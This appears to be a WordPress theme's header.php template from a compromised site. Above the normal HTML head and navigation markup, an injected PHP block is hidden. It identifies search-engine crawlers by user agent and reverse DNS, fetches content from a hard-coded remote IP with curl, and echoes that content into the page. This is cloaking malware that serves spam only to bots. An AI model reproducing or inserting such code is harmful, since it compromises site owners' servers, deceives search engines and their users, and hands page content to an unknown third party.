


<?php
$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*note#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}

if(@$isbot){

$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
$ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, "http://173.236.65.24/cakes/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");   
    $result = curl_exec($ch);       
curl_close ($ch);  

	echo $result;
}
?><!DOCTYPE HTML>
<?php
	//Basic Info
		global $wp_query;
	    $content_array = $wp_query->get_queried_object();
		if(isset($content_array->ID)){
	    	$post_id = $content_array->ID;
		}
		else $post_id=0;
		
		$template_uri = get_template_directory_uri();
	
	//Theme Options
		$themeoptions = getThemeOptions();
	
	//Page Options
		$pageoptions = getOptions($post_id);
	
	//Layout
		$layout = isset($themeoptions["tb_longwave_full_active"]) ? "full" : "box";
	
?>
<html <?php language_attributes(); ?>>
<head>
<meta charset="UTF-8">
<?php if(isset($themeoptions["tb_longwave_responsive_active"])){ ?>
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<?php } ?>
<meta http-equiv="Content-Type" content="<?php echo get_bloginfo('html_type'); ?>; charset=<?php echo get_bloginfo('charset'); ?>" />
<meta name="robots" content="index, follow" />
<!--meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE" /-->
<!--meta http-equiv="X-UA-Compatible" content="IE=edge" /-->
<title><?php echo wp_title(" &raquo; ",1,'right'); ?><?php echo get_bloginfo('name'); ?></title>
<link rel="shortcut icon" type="image/x-icon" href="<?php echo $themeoptions["tb_longwave_favicon_icon"];?>" />
<?php wp_head(); ?>
<!--[if IE 8]>
<link rel="stylesheet" type="text/css" href="<?php echo $template_uri; ?>/style/css/ie8.css" media="all" />
<![endif]-->
<!--[if IE 9]>
<link rel="stylesheet" type="text/css" href="<?php echo $template_uri; ?>/style/css/ie9.css" media="all" />
<![endif]-->
<link rel="stylesheet" href="<?php echo $template_uri."/style/css/slider.css"; ?>" type="text/css" />
<?php
		//Responsive?
		if(isset($themeoptions["tb_longwave_responsive_active"])){
			?><link rel="stylesheet" href="<?php echo $template_uri."/style/css/slider-media-queries.css"; ?>" type="text/css" /><?php
		}
?>
</head>
<body <?php body_class($layout."-layout")?>>
<!-- Begin Top Wrapper -->
<!-- Begin Body Wrapper -->
<div class="body-wrapper"> 
  
  <!-- Begin Header Wrapper -->
  <div class="header-wrapper"> 
    <!-- Begin Inner -->
    <div class="inner">
      <div class="logo"><a href="http://www.kelcyparrishdesign.com"><img src="<?php echo $themeoptions["tb_longwave_header_logo"];?>" alt="" /></a> </div>
      <nav>
	    <!-- Begin Menu -->
	    <div class="menu" id="menu">
	    <?php $defaults = array(
			'theme_location'  => 'navigation',
			'container'       => '', 
			'container_class' => '', 
			'container_id'    => '',
			'menu_class'      => '', 
			'menu_id'    	  => 'tiny',
			'fallback_cb'     => 'wp_page_menu'
		);
		wp_nav_menu( $defaults ); ?>
	    </div>
	    <!-- End Menu -->
	  </nav>
      <div class="clear"></div>
    </div>
    <!-- End Inner --> 
  </div>

  <!-- End Header Wrapper --> 
    